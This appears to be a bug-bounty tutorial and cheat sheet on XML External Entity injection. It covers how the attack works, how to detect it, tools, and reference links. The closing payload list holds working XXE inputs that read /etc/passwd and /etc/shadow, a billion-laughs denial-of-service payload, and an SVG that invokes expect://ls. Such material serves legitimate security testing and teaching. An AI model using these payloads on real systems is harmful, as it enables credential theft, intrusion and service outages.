# XXE Injection

- [How XXE Injection works](#how-xxe-injection-works)
- [Finding XXE Injection Vulnerabilties](#finding-xxe-injection-vulnerabilities)
- [Tools for XXE Injection](#tools-for-xxe-injection)
- [Tutorials for XXE Injection](#tutorials-on-xxe-injection)
- [Payloads for XXE Injection](#payloads-for-xxe-injection)

XXE Injection or XML External Entity Injection is a common vulnerability in web applications that can lead to sensitive data exposure, server-side request forgery (SSRF), denial of service (DoS), and other types of attacks. This vulnerability arises when an XML parser processes input from an untrusted source without proper validation. In this article, we will discuss XXE Injection in terms of Bug Bounty Hunting or Penetration Testing, including how to find vulnerabilities and the tools used to find them.

## How XXE Injection Works

An XML External Entity (XXE) is a reference to an external resource such as a file, URL, or database. XXE Injection occurs when an attacker can inject a malicious XML file or code that references external entities. The XML parser then processes this input, resulting in the inclusion of the external entity data in the output. This can be used to extract sensitive data, perform SSRF attacks, or cause DoS.

## Finding XXE Injection Vulnerabilities

The following are some techniques to find XXE Injection vulnerabilities in web applications:

Send XML data to the application: Start by sending XML data to the application and see if it responds with an error message that includes the input. If the error message includes the XML input, it could be a sign of XXE Injection vulnerability.

Use Burp Suite or ZAP: Tools like Burp Suite or OWASP Zed Attack Proxy (ZAP) can be used to intercept and modify XML requests. By modifying the XML request, an attacker can test for XXE Injection vulnerabilities.

Check for External Entity References: Check if the XML input contains any external entity references such as URLs, files, or databases. If it does, then it could be a sign of XXE Injection vulnerability.

Use XXE Injection payloads: Use payloads like <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo> to test for XXE Injection vulnerabilities. This payload will try to read the /etc/passwd file from the server and include it in the output.

Check for Blind XXE Injection: In some cases, the output may not include the external entity data. This is known as Blind XXE Injection. In such cases, an attacker can check for the vulnerability by sending a request to a server they control that includes a reference to an external entity. If the server receives the request, it means that the XXE Injection vulnerability exists.

## Tools to Find XXE Injection Vulnerabilities

There are several tools that can be used to find XXE Injection vulnerabilities in web applications. Some of the popular tools are:

* Burp Suite: Burp Suite is a popular web application security testing tool that can be used to find XXE Injection vulnerabilities. It includes features like intercepting and modifying requests, generating payloads, and scanning for vulnerabilities.

* OWASP Zed Attack Proxy (ZAP): ZAP is an open-source web application security testing tool that can be used to find XXE Injection vulnerabilities. It includes features like intercepting and modifying requests, generating payloads, and scanning for vulnerabilities.

* XMLQuire: XMLQuire is a standalone tool that can be used to test for XXE Injection vulnerabilities. It includes features like syntax highlighting, auto-completion, and validation.

* XXE Injection is a common vulnerability in web applications that can lead to serious security issues. Bug bounty hunters and penetration testers can use various techniques and tools to find XXE Injection vulnerabilities. It is important to perform proper validation of XML input to prevent XXE Injection vulnerabilities from occurring. By using the techniques and tools discussed in this article, security professionals can help to identify and mitigate XXE Injection vulnerabilities.


## Tools for XXE Injection
- [xxeftp](https://github.com/staaldraad/xxeserv) - A mini or micro webserver with FTP support
- [230-OOB](https://github.com/lc/230-OOB) - An Out of Band XXE Server for retriving contents over FTP and also generates payloads
- [XXEInjector](https://github.com/enjoiz/XXEinjector) - A tool for automatic exploitation of XXE vulnerabiltiy using direct and different out of band methods

### Tutorials on XXE Injection
- [XXE Injection](https://portswigger.net/web-security/xxe) - A good overview of XXE by Portswigger
- [XXE Injection](https://learn.snyk.io/lesson/xxe/) - Another good overview by Synk
- [XXE Complete Guide](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention) - A great article by HackerOne
- [XXE Attacks](https://brightsec.com/blog/xxe-attack/) - A good overview by Bright Security

### Payloads for XXE Injection

- Basic XML Example
```
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>

```
- XXE Enity Example
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>

```
- XXE File Disclosure
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>

```
-XXE Denial of Service Example
```
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<tag>&lol9;</tag>

```
- XXE Local File Inclusion Example
```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```
- XXE Base64 Encoded
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

```
- XXE: XXE inside SVG
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>

```